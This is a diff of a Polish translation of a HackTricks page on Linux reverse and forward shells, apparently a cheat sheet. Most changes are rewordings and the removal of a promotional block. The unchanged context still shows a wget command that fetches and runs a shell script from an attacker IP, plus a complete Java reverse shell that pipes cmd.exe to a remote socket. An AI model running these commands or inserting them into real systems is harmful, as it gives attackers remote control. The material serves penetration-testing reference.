@@ -10,18 +10,10 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
 {% endhint %}
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
 
 **Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić na** [**https://explainshell.com/**](https://explainshell.com)
 
@@ -68,7 +60,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Kiedy mamy do czynienia z luką **Remote Code Execution (RCE)** w aplikacji webowej opartej na Linuksie, uzyskanie reverse shell może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub skomplikowane mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywnym podejściem jest nawiązanie powłoki PTY (Pseudo Terminal), aby skuteczniej interagować z zainfekowanym systemem.
+Kiedy mamy do czynienia z podatnością **Remote Code Execution (RCE)** w aplikacji webowej opartej na Linuksie, uzyskanie reverse shell może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub skomplikowane mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywnym podejściem jest nawiązanie powłoki PTY (Pseudo Terminal), aby skuteczniej interagować z zainfekowanym systemem.
 
 Zalecanym narzędziem do tego celu jest [toboggan](https://github.com/n3rada/toboggan.git), które upraszcza interakcję z docelowym środowiskiem.
 
@@ -110,7 +102,7 @@ Musisz tylko zmodyfikować:
 * Prefiks i sufiks twojego ładunku (jeśli istnieje)
 * Sposób wysyłania ładunku (nagłówki? dane? dodatkowe informacje?)
 
-Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`**, aby uzyskać pełne PTY (zauważ, że potoki są odczytywane i zapisywane z opóźnieniem około 1,3 sekundy).
+Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`**, aby uzyskać pełne PTY (zauważ, że potoki są odczytywane i zapisywane z przybliżonym opóźnieniem 1,3 s).
 
 ## Netcat
 ```bash
@@ -333,18 +325,12 @@ int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## References
+## Odniesienia
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -356,7 +342,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Podziel się trikami hackingowymi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
